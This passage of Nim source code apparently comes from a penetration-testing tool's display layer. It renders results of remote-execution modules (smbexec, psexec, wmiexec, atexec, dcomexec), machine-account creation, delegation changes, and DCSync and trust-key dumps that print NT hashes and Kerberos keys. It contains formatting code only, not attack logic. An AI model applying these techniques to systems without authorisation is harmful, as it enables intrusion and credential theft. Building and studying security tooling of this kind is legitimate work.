      let qcols = node{"columns"}
      let qrows = node{"rows"}
      if qcols != nil and qcols.len > 0:
        var colNames: seq[string]
        for c in qcols: colNames.add c.getStr()
        var rowData: seq[seq[string]]
        if qrows != nil:
          for r in qrows:
            var row: seq[string]
            for c in r: row.add c.getStr()
            rowData.add row
        var widths = newSeq[int](colNames.len)
        for i, c in colNames: widths[i] = c.len
        for row in rowData:
          for i in 0 ..< min(row.len, widths.len):
            widths[i] = max(widths[i], row[i].len)
        var hdr = ""
        for i, c in colNames:
          if i > 0: hdr.add gray(" | ")
          hdr.add padAnsiRight(brightCyan(c), widths[i])
        var sep = ""
        for i, w in widths:
          if i > 0: sep.add gray("-+-")
          sep.add gray(repeat("-", w))
        result.add "\n" & hdr
        result.add "\n" & sep
        for row in rowData:
          var line = ""
          for i in 0 ..< widths.len:
            if i > 0: line.add gray(" | ")
            let cell = if i < row.len: row[i] else: ""
            line.add cell & repeat(' ', widths[i] - cell.len)
          result.add "\n" & line
        result.add "\n" & dim("(" & $rowData.len & " row" & (if rowData.len == 1: "" else: "s") & ")")
    if node.hasKey("exec") and node["exec"]{"ok"}.getBool():
      let output = node["exec"]{"output"}.getStr()
      if output.len > 0:
        result.add "\n" & output
    return
  of "afp":
    const BoxWidthAfp = 78
    proc visLenAfp(text: string): int =
      var i = 0
      while i < text.len:
        if text[i] == '\e' and i + 1 < text.len and text[i+1] == '[':
          while i < text.len and text[i] != 'm': inc i
          if i < text.len: inc i
        else: inc result; inc i
    proc topAfp(label: string): string =
      gray("┌─ ") & label & gray(" " & repeat("─", max(3, BoxWidthAfp - visLenAfp("┌─ " & label & " "))))
    proc botAfp(): string = gray("└" & repeat("─", BoxWidthAfp - 1))
    proc bodyAfp(text: string): string = gray("│  ") & text
    proc kvAfp(label, value: string): string =
      bodyAfp(label & repeat(' ', max(1, 11 - visLenAfp(label))) & value)
    let titleAfp = bold("AFP") & "  " & brightCyan(host & ":" & $port)
    result = topAfp(titleAfp)
    let reachAfp = node["reachable"].getBool()
    result.add "\n" & kvAfp(dim("status"), if reachAfp: green("listening") else: red("down"))
    if node{"server_name"}.getStr().len > 0:
      result.add "\n" & kvAfp(dim("server"), dim(node["server_name"].getStr()))
    if node{"machine_type"}.getStr().len > 0:
      result.add "\n" & kvAfp(dim("machine"), dim(node["machine_type"].getStr()))
    let afpVers = node{"afp_versions"}
    if afpVers != nil and afpVers.len > 0:
      var vs: seq[string]
      for v in afpVers: vs.add v.getStr()
      result.add "\n" & kvAfp(dim("versions"), dim(vs.join("  ")))
    let uams = node{"uams"}
    if uams != nil and uams.len > 0:
      var us: seq[string]
      for u in uams: us.add u.getStr()
      result.add "\n" & kvAfp(dim("uams"), dim(us.join("  ")))
    let authedAfp = node["authenticated"].getBool()
    let userAfp = node{"username"}.getStr()
    if userAfp.len > 0:
      if authedAfp:
        result.add "\n" & kvAfp(dim("session"),
          green("authenticated") & "  " & bold(userAfp) & credentialSuffix(node))
      else:
        let msg = node{"auth_message"}.getStr()
        result.add "\n" & kvAfp(dim("session"),
          red("fail") & "  " & bold(userAfp) & (if msg.len > 0: "  " & dim(msg) else: ""))
    result.add "\n" & botAfp()
    return
  of "nfs":
    const BoxWidthNfs = 78
    proc topNfs(label: string): string =
      gray("┌─ ") & label & gray(" " & repeat("─", max(3, BoxWidthNfs - visibleLenAnsi("┌─ " & label & " "))))
    proc botNfs(): string = gray("└" & repeat("─", BoxWidthNfs - 1))
    proc bodyNfs(text: string): string = gray("│  ") & text
    proc kvNfs(label, value: string): string =
      bodyNfs(label & repeat(' ', max(1, 11 - visibleLenAnsi(label))) & value)
    let titleNfs = bold("NFS") & "  " & brightCyan(host & ":111")
    result = topNfs(titleNfs)
    let reachNfs = node["reachable"].getBool()
    result.add "\n" & kvNfs(dim("status"), if reachNfs: green("listening") else: red("down"))
    if reachNfs:
      let nfsVers = node{"nfs_versions"}
      if nfsVers != nil and nfsVers.len > 0:
        var vs: seq[string]
        for v in nfsVers: vs.add "v" & $v.getInt()
        result.add "\n" & kvNfs(dim("nfs"), brightCyan(vs.join("  ")))
      let svcs = node{"rpc_services"}
      if svcs != nil and svcs.len > 0:
        const knownProgs: array[6, tuple[prog: int; name: string]] = [
          (100000, "portmapper"), (100003, "nfsd"), (100005, "mountd"),
          (100021, "nlockmgr"),  (100024, "statd"), (100227, "nfs_acl")]
        var seen: seq[tuple[name: string; vers: seq[int]]]
        for kp in knownProgs:
          var vers: seq[int]
          for svc in svcs:
            if svc{"prog"}.getInt() == kp.prog and svc{"proto"}.getInt() == 6:
              let v = svc{"vers"}.getInt()
              if v notin vers: vers.add v
          if vers.len > 0:
            seen.add (kp.name, vers)
        if seen.len > 0:
          var parts: seq[string]
          for s in seen:
            var vStrs: seq[string]
            for v in s.vers: vStrs.add $v
            parts.add dim(s.name) & gray(" v") & dim(vStrs.join(","))
          result.add "\n" & kvNfs(dim("services"), parts.join(dim("  ")))
      let exports = node{"exports"}
      if exports != nil and exports.len > 0:
        for ex in exports:
          let path = ex{"path"}.getStr()
          let groups = ex{"groups"}
          var clientStr = ""
          if groups != nil and groups.len > 0:
            var gs: seq[string]
            for g in groups: gs.add g.getStr()
            clientStr = "  " & dim(gs.join(", "))
          result.add "\n" & bodyNfs("  " & brightCyan(path) & clientStr)
      elif node{"mount_port"}.getInt() > 0:
        result.add "\n" & bodyNfs(dim("no exports"))
    result.add "\n" & botNfs()
    return
  of "webdav":
    const BoxWidthWd = 78
    proc visLenWd(text: string): int =
      var i = 0
      while i < text.len:
        if text[i] == '\e' and i + 1 < text.len and text[i+1] == '[':
          while i < text.len and text[i] != 'm': inc i
          if i < text.len: inc i
        else: inc result; inc i
    proc topWd(label: string): string =
      gray("┌─ ") & label & gray(" " & repeat("─", max(3, BoxWidthWd - visLenWd("┌─ " & label & " "))))
    proc botWd(): string = gray("└" & repeat("─", BoxWidthWd - 1))
    proc bodyWd(text: string): string = gray("│  ") & text
    proc kvWd(label, value: string): string =
      bodyWd(label & repeat(' ', max(1, 11 - visLenWd(label))) & value)
    let sslTag = if node["ssl"].getBool(): brightCyan("s") else: ""
    let titleWd = bold("WEBDAV") & sslTag & "  " & brightCyan(host & ":" & $port)
    result = topWd(titleWd)
    let reachWd = node["reachable"].getBool()
    result.add "\n" & kvWd(dim("status"), if reachWd: green("listening") else: red("down"))
    if node{"server"}.getStr().len > 0:
      result.add "\n" & kvWd(dim("server"), dim(node["server"].getStr()))
    if node["dav_supported"].getBool():
      let cls = node{"dav_classes"}
      if cls != nil and cls.len > 0:
        var cs: seq[string]
        for c in cls: cs.add c.getStr()
        result.add "\n" & kvWd(dim("dav"), dim(cs.join("  ")))
    else:
      result.add "\n" & kvWd(dim("dav"), red("not supported"))
    let authedWd = node["authenticated"].getBool()
    let userWd = node{"username"}.getStr()
    if reachWd and node["dav_supported"].getBool():
      if authedWd:
        let tag = if userWd.len > 0: bold(userWd) else: dim("anonymous")
        result.add "\n" & kvWd(dim("session"),
          green("authenticated") & "  " & tag & credentialSuffix(node))
      else:
        let msg = node{"auth_message"}.getStr()
        let tag = if userWd.len > 0: bold(userWd) else: ""
        result.add "\n" & kvWd(dim("session"),
          red("fail") & (if tag.len > 0: "  " & tag else: "") & (if msg.len > 0: "  " & dim(msg) else: ""))
    let listingWd = node{"listing"}
    if listingWd != nil and listingWd.len > 0:
      for entry in listingWd:
        result.add "\n" & bodyWd(dim(entry.getStr()))
    result.add "\n" & botWd()
    return
  of "http", "https":
    const BoxWidthHttp = 78
    proc visLenH(text: string): int =
      var i = 0
      while i < text.len:
        if text[i] == '\e' and i + 1 < text.len and text[i + 1] == '[':
          while i < text.len and text[i] != 'm': inc i
          if i < text.len: inc i
        else: inc result; inc i
    proc topH(label: string): string =
      gray("┌─ ") & label & gray(" " & repeat("─", max(3, BoxWidthHttp - visLenH("┌─ " & label & " "))))
    proc botH(): string = gray("└" & repeat("─", BoxWidthHttp - 1))
    proc bodyH(text: string): string = gray("│  ") & text
    proc kvH(label, value: string): string =
      bodyH(label & repeat(' ', max(1, 11 - visLenH(label))) & value)
    let protoH = if node["protocol"].getStr() == "https": "HTTPS" else: "HTTP"
    let titleH = bold(protoH) & "  " & brightCyan(host & ":" & $port)
    result = topH(titleH)
    let reachH = node["reachable"].getBool()
    result.add "\n" & kvH(dim("status"), if reachH: green("listening") else: red("down"))
    let code = node{"status_code"}.getInt()
    if code > 0:
      let reason = node{"reason"}.getStr()
      let statusText =
        (if code >= 200 and code < 300: green($code)
         elif code >= 300 and code < 400: yellow($code)
         else: red($code)) &
        (if reason.len > 0: "  " & dim(reason) else: "")
      result.add "\n" & kvH(dim("http"), statusText)
    if node{"server"}.getStr().len > 0:
      result.add "\n" & kvH(dim("server"), dim(node["server"].getStr()))
    if node{"title"}.getStr().len > 0:
      result.add "\n" & kvH(dim("title"), brightCyan(node["title"].getStr()))
    if node{"content_type"}.getStr().len > 0:
      result.add "\n" & kvH(dim("type"), dim(node["content_type"].getStr()))
    if node{"location"}.getStr().len > 0:
      result.add "\n" & kvH(dim("location"), dim(node["location"].getStr()))
    if node{"www_authenticate"}.getStr().len > 0:
      result.add "\n" & kvH(dim("auth"), dim(node["www_authenticate"].getStr()))
    if node{"body_snippet"}.getStr().len > 0:
      result.add "\n" & kvH(dim("body"), dim(node["body_snippet"].getStr()))
    result.add "\n" & botH()
    return
  of "scm":
    const BoxWidth = 78
    proc topX(label: string): string =
      let bare = "┌─ " & label & " "
      var visible = 0
      var i = 0
      while i < bare.len:
        if bare[i] == '\e' and i + 1 < bare.len and bare[i + 1] == '[':
          while i < bare.len and bare[i] != 'm': inc i
          if i < bare.len: inc i
        else: inc visible; inc i
      gray("┌─ ") & label & gray(" " & repeat("─", max(3, BoxWidth - visible)))
    proc botX(): string = gray("└" & repeat("─", BoxWidth - 1))
    proc bodyX(text: string): string = gray("│  ") & text
    let title = bold("SMBEXEC") & "  " & brightCyan(host & ":" & $port)
    result = topX(title)
    let principal =
      if node{"domain"}.getStr().len > 0: node{"domain"}.getStr() & "\\" & node{"username"}.getStr()
      else: node{"username"}.getStr()
    let authText =
      if node{"authenticated"}.getBool(): green("ok") & "  " & bold(principal) & credentialSuffix(node)
      else: red("fail") & "  " & dim(node{"message"}.getStr())
    result.add "\n" & bodyX(dim("auth       ") & authText)
    if node{"authenticated"}.getBool():
      let svcText =
        if node{"service_created"}.getBool(): green("created+started")
        else: red("not created")
      result.add "\n" & bodyX(dim("service    ") & svcText &
        "  " & dim("scm=" & node{"scm_status"}.getStr() &
        " rpc=" & node{"rpc_status"}.getStr()))
      let bytes = node{"bytes_read"}.getInt()
      result.add "\n" & bodyX(dim("output     ") &
        (if bytes > 0: brightCyan($bytes & " bytes")
         else: yellow("(empty)")))
      if node{"output"}.getStr().len > 0:
        for line in node{"output"}.getStr().splitLines():
          if line.len > 0:
            result.add "\n" & bodyX("  " & line)
      elif node{"message"}.getStr().len > 0:
        for line in node["message"].getStr().splitLines():
          for chunk in line.strip().wrapWords(maxLineWidth = 70).splitLines():
            result.add "\n" & bodyX(dim("  " & chunk))
    if node{"error"}.getStr().len > 0:
      result.add "\n" & bodyX(red("error: ") & node["error"].getStr())
    result.add "\n" & botX()
    return
  of "bin":
    const BoxP = 78
    proc visP(t: string): int =
      var i = 0
      while i < t.len:
        if t[i] == '\e' and i + 1 < t.len and t[i+1] == '[':
          while i < t.len and t[i] != 'm': inc i
          if i < t.len: inc i
        else: inc result; inc i
    proc topP(label: string): string =
      let head = "┌─ " & label & " "
      gray("┌─ ") & label & gray(" " & repeat("─", max(3, BoxP - visP(head))))
    proc botP(): string = gray("└" & repeat("─", BoxP - 1))
    proc bdyP(t: string): string = gray("│  ") & t
    let title = bold("PSEXEC") & "  " & brightCyan(host & ":" & $port)
    result = topP(title)
    let principal =
      if node{"domain"}.getStr().len > 0: node{"domain"}.getStr() & "\\" & node{"username"}.getStr()
      else: node{"username"}.getStr()
    let authText =
      if node{"authenticated"}.getBool(): green("ok") & "  " & bold(principal) & credentialSuffix(node)
      else: red("fail") & "  " & dim(node{"message"}.getStr())
    result.add "\n" & bdyP(dim("auth       ") & authText)
    if node{"authenticated"}.getBool():
      let upText =
        if node{"binary_uploaded"}.getBool(): green("dropped")
        else: red("upload failed")
      result.add "\n" & bdyP(dim("helper     ") & upText)
      let svcText =
        if node{"service_started"}.getBool(): green("created+started")
        elif node{"service_created"}.getBool(): yellow("created (not started)")
        else: red("not created")
      result.add "\n" & bdyP(dim("service    ") & svcText &
        "  " & dim("scm=" & node{"scm_status"}.getStr() &
        " rpc=" & node{"rpc_status"}.getStr()))
      let pipeText =
        if node{"pipe_connected"}.getBool(): green("connected")
        else: red("no pipe")
      result.add "\n" & bdyP(dim("pipe       ") & pipeText)
      if node{"success"}.getBool():
        result.add "\n" & bdyP(dim("exit       ") & brightCyan($node{"exit_code"}.getInt()))
      if node{"output"}.getStr().len > 0:
        result.add "\n" & bdyP(dim("output:"))
        for line in node["output"].getStr().splitLines():
          if line.len > 0:
            result.add "\n" & bdyP("  " & line)
      elif node{"message"}.getStr().len > 0:
        for line in node["message"].getStr().splitLines():
          for chunk in line.strip().wrapWords(maxLineWidth = 70).splitLines():
            result.add "\n" & bdyP(dim("  " & chunk))
    if node{"error"}.getStr().len > 0:
      result.add "\n" & bdyP(red("error: ") & node["error"].getStr())
    result.add "\n" & botP()
    return
  of "cim":
    const BoxW = 78
    proc visW(t: string): int =
      var i = 0
      while i < t.len:
        if t[i] == '\e' and i + 1 < t.len and t[i+1] == '[':
          while i < t.len and t[i] != 'm': inc i
          if i < t.len: inc i
        else: inc result; inc i
    proc topW(label: string): string =
      let head = "┌─ " & label & " "
      gray("┌─ ") & label & gray(" " & repeat("─", max(3, BoxW - visW(head))))
    proc botW(): string = gray("└" & repeat("─", BoxW - 1))
    proc bdyW(t: string): string = gray("│  ") & t
    let title = bold("WMIEXEC") & "  " & brightCyan(host & ":" & $port)
    result = topW(title)
    let principal =
      if node{"domain"}.getStr().len > 0:
        node["domain"].getStr() & "\\" & node{"username"}.getStr()
      else: node{"username"}.getStr()
    if node{"authenticated"}.getBool():
      result.add "\n" & bdyW(dim("auth       ") & green("ok") & "  " &
        bold(principal) & credentialSuffix(node))
      result.add "\n" & bdyW(dim("namespace  ") & magenta(node{"namespace"}.getStr()))
    else:
      result.add "\n" & bdyW(dim("auth       ") & red("fail"))
    let success = node{"success"}.getBool()
    let bytes = node{"bytes_read"}.getInt()
    result.add "\n" & bdyW(dim("status     ") &
      (if success and bytes > 0: green($bytes & " bytes captured")
       elif success: green("ok")
       else: yellow("partial")))
    if node{"message"}.getStr().len > 0:
      for line in node["message"].getStr().splitLines():
        for chunk in line.strip().wrapWords(maxLineWidth = 70).splitLines():
          result.add "\n" & bdyW(dim("  " & chunk))
    if node{"error"}.getStr().len > 0:
      result.add "\n" & bdyW(red("error: ") & node["error"].getStr())
    if node{"output"}.getStr().len > 0:
      result.add "\n" & bdyW(dim("output:"))
      for line in node["output"].getStr().splitLines():
        if line.len > 0:
          result.add "\n" & bdyW("  " & line)
    result.add "\n" & botW()
    return
  of "tsch":
    const BoxA = 78
    proc visA(t: string): int =
      var i = 0
      while i < t.len:
        if t[i] == '\e' and i + 1 < t.len and t[i+1] == '[':
          while i < t.len and t[i] != 'm': inc i
          if i < t.len: inc i
        else: inc result; inc i
    proc topA(label: string): string =
      let head = "┌─ " & label & " "
      gray("┌─ ") & label & gray(" " & repeat("─", max(3, BoxA - visA(head))))
    proc botA(): string = gray("└" & repeat("─", BoxA - 1))
    proc bdyA(t: string): string = gray("│  ") & t
    let title = bold("ATEXEC") & "  " & brightCyan(host & ":" & $port)
    result = topA(title)
    let principal =
      if node{"domain"}.getStr().len > 0: node{"domain"}.getStr() & "\\" & node{"username"}.getStr()
      else: node{"username"}.getStr()
    let authText =
      if node{"authenticated"}.getBool(): green("ok") & "  " & bold(principal) & credentialSuffix(node)
      else: red("fail") & "  " & dim(node{"message"}.getStr())
    result.add "\n" & bdyA(dim("auth       ") & authText)
    if node{"authenticated"}.getBool():
      let taskText =
        if node{"task_started"}.getBool(): green("created+started")
        elif node{"task_created"}.getBool(): yellow("created (not started)")
        else: red("not created")
      result.add "\n" & bdyA(dim("task       ") & taskText)
      if node{"output"}.getStr().len > 0:
        result.add "\n" & bdyA(dim("output:"))
        for line in node["output"].getStr().splitLines():
          if line.len > 0:
            result.add "\n" & bdyA("  " & line)
      elif node{"message"}.getStr().len > 0:
        for line in node["message"].getStr().splitLines():
          for chunk in line.strip().wrapWords(maxLineWidth = 70).splitLines():
            result.add "\n" & bdyA(dim("  " & chunk))
    if node{"error"}.getStr().len > 0:
      result.add "\n" & bdyA(red("error: ") & node["error"].getStr())
    result.add "\n" & botA()
    return
  of "mmc":
    const BoxD = 78
    proc visD(t: string): int =
      var i = 0
      while i < t.len:
        if t[i] == '\e' and i + 1 < t.len and t[i+1] == '[':
          while i < t.len and t[i] != 'm': inc i
          if i < t.len: inc i
        else: inc result; inc i
    proc topD(label: string): string =
      let head = "┌─ " & label & " "
      gray("┌─ ") & label & gray(" " & repeat("─", max(3, BoxD - visD(head))))
    proc botD(): string = gray("└" & repeat("─", BoxD - 1))
    proc bdyD(t: string): string = gray("│  ") & t
    let title = bold("DCOMEXEC") & "  " & brightCyan(host & ":" & $port)
    result = topD(title)
    let principal =
      if node{"domain"}.getStr().len > 0: node{"domain"}.getStr() & "\\" & node{"username"}.getStr()
      else: node{"username"}.getStr()
    let success = node{"success"}.getBool()
    let bytes = node{"bytes_read"}.getInt()
    result.add "\n" & bdyD(dim("user       ") & bold(principal))
    if node{"authenticated"}.getBool():
      result.add "\n" & bdyD(dim("auth       ") & green("ok") & credentialSuffix(node))
    result.add "\n" & bdyD(dim("status     ") &
      (if success and bytes > 0: green($bytes & " bytes captured")
       elif success: green("ok")
       else: red("failed")))
    if node{"output"}.getStr().len > 0:
      result.add "\n" & bdyD(dim("output:"))
      for line in node["output"].getStr().splitLines():
        if line.len > 0:
          result.add "\n" & bdyD("  " & line)
    elif node{"message"}.getStr().len > 0 and not success:
      for line in node["message"].getStr().splitLines():
        for chunk in line.strip().wrapWords(maxLineWidth = 70).splitLines():
          result.add "\n" & bdyD(dim("  " & chunk))
    if node{"error"}.getStr().len > 0:
      result.add "\n" & bdyD(red("error: ") & node["error"].getStr())
    result.add "\n" & botD()
    return
  of "ls":
    let unc = "\\\\" & node{"host"}.getStr() & "\\" & node{"share"}.getStr() &
              (if node{"path"}.getStr().len > 0: "\\" & node["path"].getStr() else: "")
    let head = bold("LS") & "  " & brightCyan(unc)
    var vis = 0; var i = 0
    while i < head.len:
      if head[i] == '\e' and i + 1 < head.len and head[i + 1] == '[':
        while i < head.len and head[i] != 'm': inc i
        if i < head.len: inc i
      else: inc vis; inc i
    result = gray("┌─ ") & head & gray(" " & repeat("─", max(3, 78 - 3 - vis - 1)))
    proc bodyL(t: string): string = "\n" & gray("│  ") & t
    if not node{"authenticated"}.getBool():
      result.add bodyL(red("auth fail") & "  " & dim(node{"message"}.getStr()))
      result.add "\n" & gray("└" & repeat("─", 77))
      return
    let cnt = node{"count"}.getInt()
    result.add bodyL(dim("entries    ") &
      (if cnt > 0: brightCyan($cnt) else: yellow("(none)")))
    if node.hasKey("entries"):
      for e in node["entries"]:
        let mark = if e{"is_directory"}.getBool(): cyan("d") else: dim("-")
        let sz =
          if e{"is_directory"}.getBool(): "     -"
          else: align($e{"size"}.getInt(), 12)
        result.add bodyL("  " & mark & " " & dim(sz) & "  " & bold(e["name"].getStr()))
    if node{"status"}.getStr() notin ["0x00000000", ""]:
      result.add bodyL(dim("status     ") & node{"status"}.getStr())
    if node{"message"}.getStr().len > 0:
      result.add bodyL(dim("message    ") & node["message"].getStr())
    result.add "\n" & gray("└" & repeat("─", 77))
    return
  of "put", "get":
    let verb = node["protocol"].getStr().toUpperAscii()
    let unc = "\\\\" & node{"host"}.getStr() & "\\" & node{"share"}.getStr() &
              "\\" & node{"remote"}.getStr()
    let symbol = if node["protocol"].getStr() == "put": "→" else: "←"
    let head = bold(verb) & "  " & brightCyan(unc) & "  " & dim(symbol) &
               "  " & brightCyan(node{"local"}.getStr())
    var visible = 0
    var i = 0
    while i < head.len:
      if head[i] == '\e' and i + 1 < head.len and head[i + 1] == '[':
        while i < head.len and head[i] != 'm': inc i
        if i < head.len: inc i
      else: inc visible; inc i
    let pad = max(3, 78 - 3 - visible - 1)
    result = gray("┌─ ") & head & gray(" " & repeat("─", pad))
    proc body(t: string): string = "\n" & gray("│  ") & t
    if node{"authenticated"}.getBool():
      result.add body(dim("auth       ") & green("ok") & credentialSuffix(node))
    else:
      result.add body(dim("auth       ") & red("fail") & "  " &
        dim(node{"message"}.getStr()))
    if node{"success"}.getBool():
      result.add body(dim("status     ") & green($node{"bytes"}.getInt() & " bytes") &
        "  " & dim(node{"message"}.getStr()))
    elif node{"error"}.getStr().len > 0 or node{"message"}.getStr().len > 0:
      let msg =
        if node{"error"}.getStr().len > 0: node["error"].getStr()
        else: node["message"].getStr()
      result.add body(red("error: ") & msg)
    result.add "\n" & gray("└" & repeat("─", 77))
    return
  of "addcomputer":
    let head = bold("ADDCOMPUTER") & "  " & brightCyan(host & ":" & $port)
    var vis = 0; var i = 0
    while i < head.len:
      if head[i] == '\e' and i + 1 < head.len and head[i + 1] == '[':
        while i < head.len and head[i] != 'm': inc i
        if i < head.len: inc i
      else: inc vis; inc i
    result = gray("┌─ ") & head & gray(" " & repeat("─", max(3, 78 - 3 - vis - 1)))
    proc bdy(t: string): string = "\n" & gray("│  ") & t
    let principal =
      if node{"auth_domain"}.getStr().len > 0:
        node["auth_domain"].getStr() & "\\" & node{"username"}.getStr()
      else: node{"username"}.getStr()
    result.add bdy(dim("auth       ") &
      (if node{"authenticated"}.getBool(): green("ok") & "  " & bold(principal) & credentialSuffix(node)
       else: red("fail") & "  " & dim(node{"message"}.getStr())))
    if node{"distinguished_name"}.getStr().len > 0:
      result.add bdy(dim("dn         ") & brightCyan(node["distinguished_name"].getStr()))
    if node{"sam_account_name"}.getStr().len > 0:
      result.add bdy(dim("sam        ") & bold(node["sam_account_name"].getStr()))
    if node{"success"}.getBool():
      result.add bdy(dim("status     ") & green("created"))
      result.add bdy(dim("password   ") & brightYellow(node["computer_password"].getStr()) &
        (if node{"password_generated"}.getBool(): dim("  generated") else: ""))
    else:
      let codeText =
        if node{"method"}.getStr() == "samr":
          "create=" & node{"create_status"}.getStr() &
            " password=" & node{"password_status"}.getStr() &
            " control=" & node{"control_status"}.getStr()
        else:
          "code " & $node{"result_code"}.getInt()
      result.add bdy(dim("status     ") & red("failed") & "  " & dim(codeText))
      if node{"diagnostic"}.getStr().len > 0:
        for line in node["diagnostic"].getStr().splitLines():
          for chunk in line.strip().wrapWords(maxLineWidth = 70).splitLines():
            result.add bdy(dim("  " & chunk))
      elif node{"error"}.getStr().len > 0:
        result.add bdy(red("error: ") & node["error"].getStr())
      elif node{"message"}.getStr().len > 0:
        result.add bdy(dim(node["message"].getStr()))
    result.add "\n" & gray("└" & repeat("─", 77))
    return
  of "rbcd":
    let head = bold("RBCD") & "  " & brightCyan(host & ":" & $port)
    var vis = 0; var i = 0
    while i < head.len:
      if head[i] == '\e' and i + 1 < head.len and head[i + 1] == '[':
        while i < head.len and head[i] != 'm': inc i
        if i < head.len: inc i
      else: inc vis; inc i
    result = gray("┌─ ") & head & gray(" " & repeat("─", max(3, 78 - 3 - vis - 1)))
    proc bdy(t: string): string = "\n" & gray("│  ") & t
    let principal =
      if node{"auth_domain"}.getStr().len > 0:
        node["auth_domain"].getStr() & "\\" & node{"username"}.getStr()
      else: node{"username"}.getStr()
    result.add bdy(dim("auth       ") &
      (if node{"authenticated"}.getBool(): green("ok") & "  " & bold(principal) & credentialSuffix(node)
       else: red("fail") & "  " & dim(node{"message"}.getStr())))
    if node{"delegate_from_sid"}.getStr().len > 0:
      result.add bdy(dim("from       ") & bold(node{"delegate_from"}.getStr()) &
        "  " & dim(node{"delegate_from_sid"}.getStr()))
    if node{"delegate_to_dn"}.getStr().len > 0:
      result.add bdy(dim("to         ") & brightCyan(node{"delegate_to_dn"}.getStr()))
    if node{"success"}.getBool():
      result.add bdy(dim("status     ") & green("modified"))
      result.add bdy(dim("message    ") & "S4U2Proxy allowed from " &
        bold(node{"delegate_from"}.getStr()) & " to " & bold(node{"delegate_to"}.getStr()))
    else:
      result.add bdy(dim("status     ") & red("failed") &
        "  " & dim("code " & $node{"result_code"}.getInt()))
      if node{"diagnostic"}.getStr().len > 0:
        for line in node["diagnostic"].getStr().splitLines():
          for chunk in line.strip().wrapWords(maxLineWidth = 70).splitLines():
            result.add bdy(dim("  " & chunk))
      elif node{"message"}.getStr().len > 0:
        result.add bdy(dim(node["message"].getStr()))
    result.add "\n" & gray("└" & repeat("─", 77))
    return
  of "dcsync":
    let op = node{"operation"}.getStr()
    if op == "trust-keys":
      let head = bold("TRUST KEYS") & "  " & brightCyan(host & ":" & $port)
      var vis = 0; var i = 0
      while i < head.len:
        if head[i] == '\e' and i + 1 < head.len and head[i + 1] == '[':
          while i < head.len and head[i] != 'm': inc i
          if i < head.len: inc i
        else: inc vis; inc i
      result = gray("┌─ ") & head & gray(" " & repeat("─", max(3, 78 - 3 - vis - 1)))
      let bdy = proc(t: string): string = "\n" & gray("│  ") & t
      let authOk = node{"authenticated"}.getBool()
      result.add bdy(dim("auth       ") &
        (if authOk: green("ok") & credentialSuffix(node) else: red("fail")))
      let trusts = node{"trusts"}
      if authOk and trusts.kind == JArray:
        result.add bdy(dim("trusts     ") & green($trusts.len & " domain trust(s)"))
        for t in trusts:
          let partner  = t{"partner"}.getStr()
          let flatName = t{"flat_name"}.getStr()
          let dir      = t{"direction"}.getStr()
          let dirName  = case dir
            of "1": "inbound"
            of "2": "outbound"
            of "3": "bidirectional"
            else: dir
          let acct = t{"account"}.getStr()
          result.add bdy("  " & bold(if partner.len > 0: partner else: flatName) &
            "  " & dim("dir=" & dirName))
          let nt = t{"nt_hash"}.getStr()
          let emptyNt = "31d6cfe0d16ae931b73c59d7e0c089c0"
          if nt.len > 0 and nt != emptyNt:
            result.add bdy("    " & dim("account  ") & acct)
            result.add bdy("    " & dim("NT  ") & brightGreen(nt))
          elif nt.len > 0:
            result.add bdy("    " & dim("NT  ") & dim(nt) & dim(" (empty)"))
          let kerbKeys = t{"kerberos_keys"}
          if kerbKeys.kind == JArray:
            for k in kerbKeys:
              let ktype = k{"type"}.getStr()
              let kval  = k{"key"}.getStr()
              result.add bdy("    " & dim(acct & ":" & ktype & ":") & cyan(kval))
          let terr = t{"error"}.getStr()
          if terr.len > 0:
            result.add bdy("    " & red("error: ") & terr)
      elif node{"error"}.getStr().len > 0:
        result.add bdy(red("error: ") & node["error"].getStr())
      result.add "\n" & gray("└" & repeat("─", 77))
      return
    let head = bold("DCSYNC") & "  " & brightCyan(host & ":" & $port)
    var vis = 0; var i = 0
    while i < head.len:
      if head[i] == '\e' and i + 1 < head.len and head[i + 1] == '[':
        while i < head.len and head[i] != 'm': inc i
        if i < head.len: inc i
      else: inc vis; inc i
    result = gray("┌─ ") & head & gray(" " & repeat("─", max(3, 78 - 3 - vis - 1)))
    let bdy = proc(t: string): string = "\n" & gray("│  ") & t
    let authOk = node{"authenticated"}.getBool()
    result.add bdy(dim("auth       ") &
      (if authOk: green("ok") & credentialSuffix(node) else: red("fail")))
    if node{"success"}.getBool():
      let accts = node{"accounts"}
      let count = if accts.kind == JArray: accts.len else: 0
      result.add bdy(dim("status     ") & green($count & " account(s) dumped"))
      if accts.kind == JArray:
        let emptyNt  = "31d6cfe0d16ae931b73c59d7e0c089c0"
        let lmPlaceholder = dcsyncmod.LmHashPlaceholder
        for acct in accts:
          let user   = acct{"username"}.getStr()
          let domain = acct{"domain"}.getStr()
          let rid    = acct{"rid"}.getInt()
          let nt     = acct{"nt_hash"}.getStr()
          let lm     = acct{"lm_hash"}.getStr()
          let ridStr = if rid > 0: " (RID " & $rid & ")" else: ""
          result.add bdy("  " & bold(if user.len > 0: user else: "(unknown)") & ridStr)
          if nt.len > 0 and nt != emptyNt:
            result.add bdy("    " & dim("NT  ") & brightGreen(nt))
          elif nt.len > 0:
            result.add bdy("    " & dim("NT  ") & dim(nt) & dim(" (empty)"))
          if lm.len > 0 and lm != lmPlaceholder:
            result.add bdy("    " & dim("LM  ") & yellow(lm))
          let ntOut = if nt.len > 0: nt else: emptyNt
          let domUser = if domain.len > 0: domain & "\\" & user else: user
          result.add bdy("    " & dim(domUser & ":" & $rid & ":" & lmPlaceholder & ":" & ntOut & ":::"))
          let kerbKeys = acct{"kerberos_keys"}
          if kerbKeys.kind == JArray:
            for k in kerbKeys:
              let ktype = k{"type"}.getStr()
              let kval  = k{"key"}.getStr()
              result.add bdy("    " & dim(domUser & ":" & ktype & ":") & cyan(kval))
    elif node{"error"}.getStr().len > 0:
      result.add bdy(red("error: ") & node["error"].getStr())
    elif node{"message"}.getStr().len > 0:
      result.add bdy(dim(node["message"].getStr()))
    result.add "\n" & gray("└" & repeat("─", 77))
    return
  of "secrets":
    let head = bold("SECRETS") & "  " & brightCyan(host & ":" & $port)
    var vis = 0; var i = 0
    while i < head.len:
      if head[i] == '\e' and i + 1 < head.len and head[i + 1] == '[':
        while i < head.len and head[i] != 'm': inc i
        if i < head.len: inc i
      else: inc vis; inc i
    result = gray("┌─ ") & head & gray(" " & repeat("─", max(3, 78 - 3 - vis - 1)))
    let bdy = proc(t: string): string = "\n" & gray("│  ") & t
    let authOk = node{"authenticated"}.getBool()
    result.add bdy(dim("auth       ") &
      (if authOk: green("ok") & credentialSuffix(node) else: red("fail")))
    let bootKeyStr = node{"boot_key"}.getStr()
    if bootKeyStr.len > 0:
